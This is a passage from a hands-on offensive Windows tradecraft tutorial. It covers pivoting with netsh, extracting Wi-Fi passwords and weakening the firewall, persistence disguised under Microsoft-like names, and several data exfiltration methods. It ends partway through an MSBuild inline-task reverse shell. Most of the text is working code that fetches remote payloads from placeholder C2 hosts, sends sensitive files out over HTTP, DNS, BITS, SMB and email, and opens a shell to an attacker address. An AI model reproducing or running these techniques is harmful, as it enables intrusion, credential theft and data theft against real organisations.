One of the most powerful but often overlooked native Windows tools for lateral movement is netsh.exe - the Network Shell utility. While administrators use it for configuring network settings, firewalls, and interfaces, it has capabilities that are incredibly useful for red teamers, particularly for network pivoting and credential harvesting.

Let me show you how to turn a compromised Windows system into a network pivot using only netsh.

#### Port Forwarding and Pivoting

The most valuable feature of netsh for offensive operations is port forwarding. If you've compromised a system that has access to internal networks you can't reach directly, you can use netsh to forward ports and pivot through that system.

Here's the basic concept: you configure the compromised system to listen on a port and forward all traffic to an internal target. This effectively turns the compromised system into a proxy, letting you access internal services that aren't directly reachable from your position.

```powershell
# Set up port forwarding from compromised host to internal server
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.10.50

# Now you can access the internal web server at http://compromised-host:8080
# and it forwards to http://192.168.10.50:80
```

Let me break down this command. The `interface portproxy` context manages port forwarding in netsh, and `add v4tov4` adds an IPv4-to-IPv4 forwarding rule. The `listenport=8080` parameter sets the port to listen on (on the compromised system), while `listenaddress=0.0.0.0` makes it listen on all interfaces (or you can specify a specific IP). The `connectport=80` parameter defines the port to forward to on the target, and `connectaddress=192.168.10.50` specifies the internal IP address to forward traffic to.

This is incredibly powerful for several scenarios:

**Scenario 1: Accessing Internal Web Applications**
```powershell
# Forward local port 8443 to internal HTTPS service
netsh interface portproxy add v4tov4 listenport=8443 listenaddress=0.0.0.0 connectport=443 connectaddress=internal-app.company.local
```

Now you can browse to `https://compromised-host:8443` and access the internal application.

**Scenario 2: Pivoting to Internal Databases**
```powershell
# Forward to internal SQL Server
netsh interface portproxy add v4tov4 listenport=1433 listenaddress=0.0.0.0 connectport=1433 connectaddress=sql-server.internal.local

# Now connect with: sqlcmd -S compromised-host -U sa -P password
```

**Scenario 3: RDP Pivoting**
```powershell
# Forward RDP to internal systems
netsh interface portproxy add v4tov4 listenport=3389 listenaddress=0.0.0.0 connectport=3389 connectaddress=admin-workstation.internal

# Connect via: mstsc /v:compromised-host:3389
```

**Scenario 4: SSH Tunneling to Internal Linux Systems**
```powershell
# Forward to internal SSH server
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=0.0.0.0 connectport=22 connectaddress=linux-server.internal
```

To view all configured port forwards:

```powershell
# List all port forwarding rules
netsh interface portproxy show all

# Or specifically show v4tov4 rules
netsh interface portproxy show v4tov4
```

To remove a forwarding rule when you're done:

```powershell
# Delete specific rule
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0

# Or delete all rules
netsh interface portproxy reset
```

The beautiful thing about netsh port forwarding is that it's completely native, requires no additional software, and persists across reboots. The forwarding rules are stored in the registry and automatically reinstated when the system restarts.

Important OPSEC note: Port forwarding creates network connections that can be monitored. The compromised system will show connections to the internal targets, and network monitoring might detect unusual traffic patterns. However, since netsh is a legitimate administrative tool and port forwarding is a normal network configuration task, it's less suspicious than running custom proxy tools.

#### WiFi Credential Harvesting

If you've compromised a laptop or any system with WiFi capability, netsh can extract saved WiFi credentials:

```powershell
# List all saved WiFi profiles
netsh wlan show profiles

# Show detailed information including password for specific network
netsh wlan show profile name="CompanyWiFi" key=clear

# Export all WiFi profiles to XML files
netsh wlan export profile key=clear folder=C:\temp
```

The `key=clear` parameter is critical - it tells netsh to show the password in cleartext. Without it, you only see the encrypted version.

Here's what the output looks like:

```
Profile CompanyWiFi on interface Wi-Fi:
=======================================================================

Applied: All User Profile

Profile information
-------------------
    Version                : 1
    Type                   : Wireless LAN
    Name                   : CompanyWiFi
    Control options        :
        Connection mode    : Connect automatically
        Network broadcast  : Connect only if this network is broadcasting
        AutoSwitch         : Do not switch to other networks

Security settings
-----------------
    Authentication         : WPA2-Personal
    Cipher                 : CCMP
    Authentication         : WPA2-Personal
    Security key           : Present
    Key Content            : P@ssw0rd123!
```

The WiFi password is right there in cleartext. This is particularly valuable because:
1. WiFi passwords are often reused for other systems or services
2. The password might be the corporate WiFi password, which could be used for physical access operations
3. Personal hotspot passwords can reveal patterns about user password choices

You can automate the extraction of all WiFi credentials:

```powershell
# PowerShell script to extract all WiFi passwords
$profiles = (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object {
    $_.ToString().Split(':')[1].Trim()
}

foreach ($profile in $profiles) {
    $password = (netsh wlan show profile name="$profile" key=clear) | Select-String "Key Content"
    if ($password) {
        Write-Output "Network: $profile"
        Write-Output $password
        Write-Output "---"
    }
}
```

#### Firewall Manipulation

Netsh can also manipulate Windows Firewall, which is useful for opening ports or disabling protections:

```powershell
# Disable Windows Firewall completely (very obvious)
netsh advfirewall set allprofiles state off

# Re-enable it
netsh advfirewall set allprofiles state on

# Add firewall rule to allow inbound connection
netsh advfirewall firewall add rule name="Allow Port 4444" dir=in action=allow protocol=TCP localport=4444

# Delete the rule when done
netsh advfirewall firewall delete rule name="Allow Port 4444"

# Show current firewall status
netsh advfirewall show allprofiles

# Export firewall configuration
netsh advfirewall export C:\temp\firewall-backup.wfw

# Import firewall configuration
netsh advfirewall import C:\temp\firewall-backup.wfw
```

Adding specific firewall rules is much stealthier than completely disabling the firewall. If you need to receive a reverse shell on port 4444, add a rule allowing that specific port rather than turning off the entire firewall.

#### Network Interface Information

Netsh can also enumerate network configuration, which is useful for understanding the network environment:

```powershell
# Show all network interfaces and their configuration
netsh interface show interface

# Show IP configuration
netsh interface ip show config

# Show IP addresses
netsh interface ip show addresses

# Show routing table
netsh interface ip show route

# Show DNS servers
netsh interface ip show dnsservers
```

This information helps you understand the network topology and plan your lateral movement.

#### Persistence via netsh

You can use netsh to create persistent port forwards that survive reboots, effectively creating a backdoor for re-entry:

```powershell
# Create persistent port forward to your C2 server
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=443 connectaddress=your-c2-server.com
```

Now any connection to this system on port 8080 gets forwarded to your C2 server on port 443. This could be used to maintain a communication channel or provide an alternative entry point.

#### Combining netsh with Other Techniques

Here's a practical example of using netsh for a complete network pivot scenario:

```powershell
# Step 1: Set up port forward to internal system you want to access
netsh interface portproxy add v4tov4 listenport=3389 listenaddress=0.0.0.0 connectport=3389 connectaddress=10.10.10.50

# Step 2: Add firewall rule to allow the connection
netsh advfirewall firewall add rule name="Remote Desktop Relay" dir=in action=allow protocol=TCP localport=3389

# Step 3: From your attacker machine, RDP to the compromised host
# This actually connects you to 10.10.10.50 via the pivot

# Step 4: Clean up when done
netsh interface portproxy delete v4tov4 listenport=3389 listenaddress=0.0.0.0
netsh advfirewall firewall delete rule name="Remote Desktop Relay"
```

The reason netsh is so powerful for pivoting is that it's completely native to Windows, requires no additional tools, and performs a function that network administrators use legitimately. Unlike running a SOCKS proxy or custom tunneling tool, netsh port forwarding looks like normal network configuration.

From a detection perspective, defenders should monitor netsh commands with `portproxy` parameters, unexpected firewall rule additions, WiFi credential extraction (commands with `key=clear`), and netsh execution from unusual parent processes.

But in practice, netsh is used so frequently by administrators that distinguishing malicious use from legitimate use is challenging without behavioral analytics.

## Persistence Mechanisms

After establishing lateral movement capabilities, you need persistence - the ability to maintain access even if your initial entry point is discovered and closed, if the system reboots, or if users log off.

Let me walk you through various persistence techniques using only native Windows tools. The key to effective persistence is choosing methods that blend in with legitimate system operations and are unlikely to be discovered during routine system administration.

### Registry Run Keys: The Classic

Registry run keys are probably the most well-known persistence method, which means they're also one of the most monitored. But they're still effective when implemented carefully.

Run keys cause programs to execute when a user logs in. There are multiple run key locations in the registry, each with different scope and privilege requirements:

```powershell
# Current user run key (doesn't require admin privileges)
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "OneDriveUpdate" -Value "powershell.exe -WindowStyle Hidden -NoProfile -Command IEX (New-Object Net.WebClient).DownloadString('http://your-c2-server.com/payload.ps1')" -PropertyType String -Force
```

This creates a registry value in the current user's run key. Every time this user logs in, the command executes. The command in this example downloads and executes a PowerShell script from your C2 server directly into memory without touching disk.

For system-wide persistence that affects all users:

```powershell
# Local machine run key (requires admin privileges)
New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityUpdate" -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -Command your_payload" -PropertyType String -Force
```

The key to making run keys stealthy is choosing names and commands that look legitimate. "OneDriveUpdate" or "SecurityUpdate" are far less suspicious than "Backdoor" or "Payload".

There are also RunOnce keys, which execute once and then delete themselves:

```powershell
# RunOnce key
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "ConfigUpdate" -Value "powershell.exe -Command your_payload" -PropertyType String -Force
```

These might seem less useful, but they can be combined with your payload re-creating itself in another RunOnce key, creating a chain that's harder to trace.

Other useful run key locations:

```powershell
# Run key locations (in order of visibility to users)
# HKLM - affects all users, requires admin, highly visible
HKLM:\Software\Microsoft\Windows\CurrentVersion\Run
HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce

# HKCU - current user only, doesn't require admin, less visible
HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce

# Explorer Run - executes when Explorer starts
HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run

# RunServices keys (less commonly monitored)
HKLM:\Software\Microsoft\Windows\CurrentVersion\RunServices
HKCU:\Software\Microsoft\Windows\CurrentVersion\RunServices
```

To check what's already in run keys (useful for blending in):

```powershell
# List existing run key entries
Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
```

### Startup Folder: Simple but Effective

The Startup folder is even simpler than registry run keys - anything in this folder executes when the user logs in:

```powershell
# Current user startup folder
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"

# Create a shortcut to PowerShell
$WshShell = New-Object -ComObject WScript.Shell
$shortcut = $WshShell.CreateShortcut("$startupPath\OneDrive.lnk")
$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = "-WindowStyle Hidden -NoProfile -Command your_payload"
$shortcut.WorkingDirectory = "C:\Windows\System32"
$shortcut.WindowStyle = 7  # Hidden
$shortcut.Description = "OneDrive Sync"
$shortcut.Save()
```

This creates a shortcut that looks like it's for OneDrive but actually executes your payload. The WindowStyle = 7 means the window is hidden.

For all users (requires admin):

```powershell
$startupPath = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
# Same shortcut creation code as above
```

Alternatively, you can directly place a script or batch file in the Startup folder:

```powershell
$script = @"
@echo off
powershell.exe -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://your-c2.com/payload.ps1')
"@

Set-Content -Path "$startupPath\WindowsUpdate.bat" -Value $script
```

The advantage of Startup folder persistence is its simplicity. The disadvantage is that it's one of the first places defenders look when hunting for persistence.

### Scheduled Tasks: The Flexible Option

Scheduled tasks are far more flexible than run keys because you can control exactly when and how often they execute:

```powershell
# Create a scheduled task that runs at user logon
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -Command your_payload"
$trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden

Register-ScheduledTask -TaskName "MicrosoftEdgeUpdateTaskUserCore" -Action $action -Trigger $trigger -Principal $principal -Settings $settings
```

Let me explain the parameters. The `-AtLogOn` parameter triggers the task when any user logs on, while `-RunLevel Highest` runs it with elevated privileges if the user is an admin. The `-AllowStartIfOnBatteries` and `-DontStopIfGoingOnBatteries` flags ensure the task runs on laptops regardless of power state. Finally, `-Hidden` hides the task from the Task Scheduler GUI (though it's still visible from PowerShell or schtasks.exe).

The task name "MicrosoftEdgeUpdateTaskUserCore" is chosen to blend in - this is an actual Microsoft Edge update task name, so it won't raise suspicion.

For a task that runs periodically instead of at logon:

```powershell
# Task that runs every 6 hours
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 6) -RepetitionDuration ([TimeSpan]::MaxValue)

Register-ScheduledTask -TaskName "WindowsBackupMonitor" -Action $action -Trigger $trigger -Principal $principal -Settings $settings
```

Or a task that runs daily at a specific time:

```powershell
# Task that runs every day at 3 AM
$trigger = New-ScheduledTaskTrigger -Daily -At 3am

Register-ScheduledTask -TaskName "WindowsUpdateCheck" -Action $action -Trigger $trigger -Principal $principal -Settings $settings
```

To make the task run as SYSTEM (requires admin):

```powershell
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName "WindowsDefenderCache" -Action $action -Trigger $trigger -Principal $principal -Settings $settings
```

Scheduled tasks are great for persistence because they're extremely flexible in scheduling, they can run with elevated privileges, thousands of legitimate scheduled tasks exist on typical Windows systems making yours blend in, and they persist across reboots and user logoffs without any additional configuration.

To list existing scheduled tasks and find good names to mimic:

```powershell
Get-ScheduledTask | Where-Object {$_.TaskPath -like "*Microsoft*"} | Select-Object TaskName
```

### WMI Event Subscriptions: The Stealthy Approach

WMI event subscriptions are one of the most sophisticated and stealthy persistence mechanisms. They're rarely monitored, difficult to detect, and incredibly powerful.

WMI event subscriptions consist of three components that work together. An event filter serves as the trigger, defining what event to watch for. An event consumer specifies the action to take when the event occurs. Finally, a binding connects the filter to the consumer, completing the subscription.

Here's a complete example:

```powershell
# Step 1: Create an event filter (trigger)
$filterArgs = @{
    Name = "WindowsUpdateFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs

# Step 2: Create an event consumer (action)
$consumerArgs = @{
    Name = "WindowsUpdateConsumer"
    CommandLineTemplate = "powershell.exe -WindowStyle Hidden -NoProfile -Command your_payload"
}
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs

# Step 3: Bind the filter to the consumer
$bindingArgs = @{
    Filter = $filter
    Consumer = $consumer
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $bindingArgs
```

Let me explain what this does. The event filter watches for modifications to Win32_PerfFormattedData_PerfOS_System, which happens constantly as performance counters update. The `WITHIN 60` clause means it checks every 60 seconds. So effectively, this runs your payload every 60 seconds.

You can create different triggers for different purposes:

```powershell
# Trigger when a specific process starts
$query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'outlook.exe'"

# Trigger at a specific time
$query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 14 AND TargetInstance.Minute = 30"

# Trigger when a user logs in
$query = "SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession'"
```

To view existing WMI event subscriptions (useful for cleanup or detection):

```powershell
# List all event filters
Get-WmiObject -Namespace root\subscription -Class __EventFilter

# List all event consumers
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer

# List all bindings
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding
```

To remove a WMI event subscription:

```powershell
Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='WindowsUpdateFilter'" | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='WindowsUpdateConsumer'" | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object {$_.Filter -match 'WindowsUpdateFilter'} | Remove-WmiObject
```

WMI event subscriptions are powerful because they're not visible in Task Scheduler or obvious registry locations, most administrators don't know how to check for them, they can trigger based on complex system events, they persist across reboots, and they're rarely monitored by security tools.

The downside is they require administrator privileges to create.

### Winlogon Registry Keys

Winlogon keys control what happens during the Windows login process. Certain keys execute programs during login:

```powershell
# Userinit key - runs when users log in
$currentUserinit = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon").Userinit
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit" -Value "$currentUserinit,powershell.exe -WindowStyle Hidden -Command your_payload" -PropertyType String -Force
```

The default Userinit value is `C:\Windows\system32\userinit.exe,`. By appending our payload to this value, we maintain normal login functionality while also executing our payload.

Another Winlogon key is the Shell value:

```powershell
# Shell key - defines the Windows shell
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "explorer.exe,powershell.exe -WindowStyle Hidden -Command your_payload" -PropertyType String -Force
```

The default Shell value is `explorer.exe`. By adding our payload, we execute it every time Explorer starts.

IMPORTANT: Be very careful with Winlogon keys. If you misconfigure them, you can break the login process or make the system unbootable. Always preserve the original values and append to them rather than replacing them.

Also note that Winlogon keys are well-known persistence locations and are typically monitored by security tools. Use them cautiously and only when other methods aren't suitable.

## Data Exfiltration

Once you've established persistence, moved laterally, and collected the data you came for, you need to get it out of the target environment. Data exfiltration is often the most challenging phase because this is where you're moving potentially large amounts of data off the network, which can trigger network monitoring alerts if not done carefully.

Let me show you various techniques for exfiltrating data using only native Windows tools.

### PowerShell Web Requests

PowerShell makes HTTP/HTTPS requests trivial, which means you can exfiltrate data to a web server you control:

```powershell
# Upload a file via HTTP POST
$fileContent = [System.IO.File]::ReadAllBytes("C:\sensitive\data.txt")
$boundary = [System.Guid]::NewGuid().ToString()
$headers = @{"Content-Type" = "multipart/form-data; boundary=$boundary"}

Invoke-RestMethod -Uri "http://your-exfil-server.com/upload" -Method POST -Headers $headers -Body $fileContent
```

This reads a file into memory and POSTs it to your exfiltration server. The web request looks like normal HTTP traffic, and if you use HTTPS, the content is encrypted in transit.

For larger files, you might want to chunk them:

```powershell
# Upload file in chunks
$file = "C:\sensitive\large-file.zip"
$chunkSize = 1MB
$buffer = New-Object byte[] $chunkSize
$fileStream = [System.IO.File]::OpenRead($file)

$chunkNumber = 0
while (($bytesRead = $fileStream.Read($buffer, 0, $chunkSize)) -gt 0) {
    $chunkNumber++
    $chunkData = $buffer[0..($bytesRead-1)]
    Invoke-RestMethod -Uri "http://your-server.com/upload?chunk=$chunkNumber" -Method POST -Body $chunkData
}
$fileStream.Close()
```

This reads the file in 1MB chunks and uploads each chunk separately. On your exfiltration server, you'd reassemble the chunks.

For HTTPS with self-signed certificates (common for C2 servers), you need to bypass certificate validation:

```powershell
# Bypass SSL certificate validation
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

# Now HTTPS requests will work with self-signed certs
Invoke-RestMethod -Uri "https://your-server.com/upload" -Method POST -Body $data
```

### Certutil: The Unexpected File Transfer Tool

> **🚨 EDR REALITY CHECK (2025):** Certutil for file downloads/uploads is **heavily monitored** and will be flagged even by Windows Defender in many configurations. The `-urlcache` switch for downloading files is a well-known indicator of compromise. Modern EDRs have specific signatures for certutil being used for non-certificate operations. This technique was stealthy years ago but is now one of the first things blue teams look for. Consider alternative download methods (PowerShell with obfuscation, compiled binaries, or legitimate admin tools like bits transfer) for modern engagements.

Certutil is a built-in Windows utility for managing certificates, but it has a lesser-known feature for downloading files:

```batch
certutil.exe -urlcache -split -f http://your-server.com/upload C:\temp\upload.txt
```

The `-urlcache` flag uses the URL cache, `-split` writes the file to disk, and `-f` forces overwriting existing files.

But certutil can also be used for uploads if your server supports it. The trick is encoding the file as base64 and sending it as part of a URL:

```powershell
# Encode file as base64
$fileContent = [System.IO.File]::ReadAllBytes("C:\sensitive\data.txt")
$base64 = [Convert]::ToBase64String($fileContent)

# Split into chunks (URLs have length limits)
$chunkSize = 8000
for ($i = 0; $i -lt $base64.Length; $i += $chunkSize) {
    $chunk = $base64.Substring($i, [Math]::Min($chunkSize, $base64.Length - $i))
    certutil.exe -urlcache -split -f "http://your-server.com/receive?data=$chunk" null
}
```

Your server would collect these chunks and reassemble the base64-encoded file.

After using certutil, clean the URL cache:

```batch
certutil.exe -urlcache * delete
```

### BITS: Background Intelligent Transfer Service

BITS is designed for transferring large files in the background, which makes it perfect for stealthy exfiltration:

```batch
# Create a BITS job for upload
bitsadmin /create ExfilJob
bitsadmin /addfile ExfilJob C:\sensitive\data.zip http://your-server.com/upload/data.zip
bitsadmin /setpriority ExfilJob FOREGROUND
bitsadmin /resume ExfilJob
```

BITS transfers are resumable, which means if the connection is interrupted, the transfer will automatically resume when connectivity is restored. They also throttle themselves to avoid saturating the network connection, which helps avoid detection by network monitoring tools.

To monitor the transfer:

```batch
bitsadmin /monitor
```

Once complete, remove the job:

```batch
bitsadmin /complete ExfilJob
```

BITS can also download files:

```batch
bitsadmin /transfer DownloadJob /download /priority HIGH http://your-server.com/file.zip C:\temp\file.zip
```

The advantage of BITS is that it's a Microsoft service designed for network transfers, so BITS traffic looks completely legitimate. Windows Update uses BITS, so there's always some BITS traffic on corporate networks.

### SMB-Based Exfiltration

If your exfiltration server is reachable via SMB (port 445), you can simply copy files:

```powershell
# Map a drive to your server
net use Z: \\your-exfil-server\share /user:username password

# Copy files
Copy-Item C:\sensitive\data.zip Z:\

# Disconnect
net use Z: /delete
```

Or without mapping a drive:

```powershell
Copy-Item C:\sensitive\data.zip \\your-exfil-server\share\
```

SMB is encrypted (SMBv3) and looks like normal file sharing traffic. If your exfiltration server is on the same network or reachable via VPN, this is one of the stealthiest methods.

### DNS Exfiltration

DNS exfiltration is slower but very stealthy because DNS traffic is rarely inspected and almost never blocked:

```powershell
# Read the file to exfiltrate
$data = [System.IO.File]::ReadAllBytes("C:\sensitive\passwords.txt")
$encoded = [Convert]::ToBase64String($data)

# DNS labels max out at 63 characters, domains at 253
$chunkSize = 32  # Conservative chunk size
$domain = "exfil.yourdomain.com"

for ($i = 0; $i -lt $encoded.Length; $i += $chunkSize) {
    $chunk = $encoded.Substring($i, [Math]::Min($chunkSize, $encoded.Length - $i))
    $subdomain = "$chunk.$domain"

    # Make DNS query
    nslookup $subdomain 2>$null | Out-Null

    # Small delay to avoid overwhelming DNS
    Start-Sleep -Milliseconds 100
}
```

On your DNS server (which could be an authoritative DNS server for your domain or a server logging DNS queries), you'd capture these queries and reconstruct the base64-encoded data.

This is slow - DNS queries have significant overhead - but it's extremely stealthy. Every system makes constant DNS queries, so your exfiltration blends in perfectly.

For more sophisticated DNS exfiltration, you can include sequence numbers and error correction:

```powershell
$sequenceNumber = 0
for ($i = 0; $i -lt $encoded.Length; $i += $chunkSize) {
    $chunk = $encoded.Substring($i, [Math]::Min($chunkSize, $encoded.Length - $i))
    $subdomain = "seq$sequenceNumber.$chunk.$domain"
    nslookup $subdomain 2>$null | Out-Null
    $sequenceNumber++
    Start-Sleep -Milliseconds 100
}

# Send end marker
nslookup "end.$domain" 2>$null | Out-Null
```

This way, if any packets are lost, you can identify which chunks are missing and request them again.

### ICMP Exfiltration

ICMP (ping) packets can carry data in their payload. While PowerShell's Test-Connection doesn't let you specify custom data, you can use other approaches:

```powershell
# This is more limited but possible with some creativity
# Encode data in the target hostname for ping
$data = "sensitive_data_here"
$encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data))

# Use ping to your server (data in hostname)
ping -n 1 "$encoded.your-exfil-server.com"
```

This puts the data in the DNS query that ping makes to resolve the hostname, so it's really DNS exfiltration disguised as ping.

True ICMP payload exfiltration requires lower-level packet crafting that's difficult with only native tools.

### Email-Based Exfiltration

If the compromised system has email configured (Exchange, SMTP, or Outlook), you can exfiltrate via email:

```powershell
# Send email with attachment using Send-MailMessage
$smtp = "smtp.company.com"
$from = "compromised-user@company.com"
$to = "exfil@your-domain.com"
$subject = "Weekly Report"
$body = "Please see the attached report."

Send-MailMessage -From $from -To $to -Subject $subject -Body $body -Attachments "C:\sensitive\data.zip" -SmtpServer $smtp
```

This only works if the system can send email without authentication (internal mail relay) or if you have email credentials.

A more sophisticated approach uses Outlook COM automation:

```powershell
# Use Outlook to send email
$outlook = New-Object -ComObject Outlook.Application
$mail = $outlook.CreateItem(0)  # 0 = MailItem

$mail.To = "exfil@your-domain.com"
$mail.Subject = "Monthly Report"
$mail.Body = "See attachment."
$mail.Attachments.Add("C:\sensitive\data.zip")
$mail.Send()

[System.Runtime.Interopservices.Marshal]::ReleaseComObject($outlook) | Out-Null
```

This uses the victim's Outlook to send email, which means it appears to come from a legitimate user and uses their email credentials automatically.

## Bypassing Application Whitelisting

Application whitelisting is one of the most effective security controls organizations can implement. Tools like AppLocker, Windows Defender Application Control (WDAC), and third-party solutions aim to prevent unauthorized code execution by only allowing approved executables to run. In theory, this should stop attackers dead in their tracks - no custom tools, no malware, no code execution.

In practice, it's not that simple. Windows includes dozens of legitimate, Microsoft-signed executables that can be abused to execute arbitrary code. These binaries are typically whitelisted by default because administrators need them for legitimate purposes. This creates a perfect opportunity for attackers - we can execute our code through trusted binaries that security policies explicitly allow.

Let me show you the most reliable techniques for bypassing application whitelisting using only native Windows tools.

### MSBuild: Executing C# Code Inline

MSBuild.exe is Microsoft's build engine, used by Visual Studio and the .NET framework to compile projects. It's a signed Microsoft binary located in the .NET framework directories, and it's almost always whitelisted because developers need it.

Here's what makes MSBuild so powerful for attackers: it can execute inline C# code embedded in XML project files. The build process includes a feature called "inline tasks" that allows you to define and execute .NET code directly within the build file. We can abuse this to run arbitrary C# code without compiling a separate executable.

Let me show you how this works. First, we create an MSBuild project file with embedded C# code:

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- Define a target that will execute when the project is built -->
  <Target Name="Execute">
    <ClassExample />
  </Target>

  <!-- Define an inline task with C# code -->
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
      <![CDATA[
        using System;
        using System.Diagnostics;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;

        public class ClassExample : Task
        {
            public override bool Execute()
            {
                // Your malicious code here
                // This example just launches calc.exe, but you could do anything
                Process.Start("calc.exe");

                // Or execute PowerShell
                Process.Start(new ProcessStartInfo()
                {
                    FileName = "powershell.exe",
                    Arguments = "-NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('http://your-c2.com/payload.ps1')\"",
                    UseShellExecute = false,
                    CreateNoWindow = true
                });

                return true;
            }
        }
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

Let me break down what's happening here. The `<UsingTask>` element defines an inline task using the CodeTaskFactory, which allows us to write C# code directly in the XML. The `<Code>` section contains a full C# class that inherits from the Task class. The `Execute()` method is where our code runs - in this example, I'm launching calc.exe and then executing a PowerShell download cradle.

To execute this, save the XML to a file (let's call it `build.xml`) and run:

```powershell
# Execute the MSBuild project
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\temp\build.xml

# Or for 64-bit systems
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\temp\build.xml
```

When MSBuild processes this file, it compiles the C# code in memory and executes it. From an application whitelisting perspective, this looks completely legitimate - MSBuild.exe is a trusted Microsoft binary doing what it's designed to do.

The power of this technique is that you can execute any .NET code you want. You could download and execute additional payloads, implement a full reverse shell, execute shellcode through P/Invoke, access Windows APIs for privilege escalation, or perform reconnaissance and data collection. The possibilities are limited only by what you can do in C# code.

Here's a more advanced example that implements a reverse shell:

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Execute">
    <ReverseShell />
  </Target>
  <UsingTask TaskName="ReverseShell" TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
      <![CDATA[
        using System;
        using System.Net;
        using System.Net.Sockets;
        using System.Text;
        using System.IO;
        using System.Diagnostics;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;

        public class ReverseShell : Task
        {
            public override bool Execute()
            {
                try
                {
                    // Connect to attacker's server
                    using (TcpClient client = new TcpClient("attacker-ip", 4444))
                    {
                        using (Stream stream = client.GetStream())
                        {
                            using (StreamReader reader = new StreamReader(stream))
                            using (StreamWriter writer = new StreamWriter(stream))
                            {
                                writer.AutoFlush = true;

                                // Send initial banner
                                writer.WriteLine("MSBuild shell connected from " + Environment.MachineName);

                                // Command loop
                                while (true)
                                {
                                    writer.Write("MSBuild> ");
                                    string command = reader.ReadLine();
                                    if (string.IsNullOrEmpty(command)) break;

                                    if (command.ToLower() == "exit") break;

                                    // Execute command
                                    Process proc = new Process();
                                    proc.StartInfo.FileName = "cmd.exe";
                                    proc.StartInfo.Arguments = "/c " + command;
                                    proc.StartInfo.UseShellExecute = false;
                                    proc.StartInfo.RedirectStandardOutput = true;
                                    proc.StartInfo.RedirectStandardError = true;
                                    proc.Start();

                                    string output = proc.StandardOutput.ReadToEnd();
                                    string error = proc.StandardError.ReadToEnd();
                                    proc.WaitForExit();

                                    writer.WriteLine(output);
                                    if (!string.IsNullOrEmpty(error))
                                        writer.WriteLine("Error: " + error);
                                }
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    // Silently fail - don't want to alert anyone
                }
                return true;
            }
        }
      ]]>
      </Code>
    </Task>
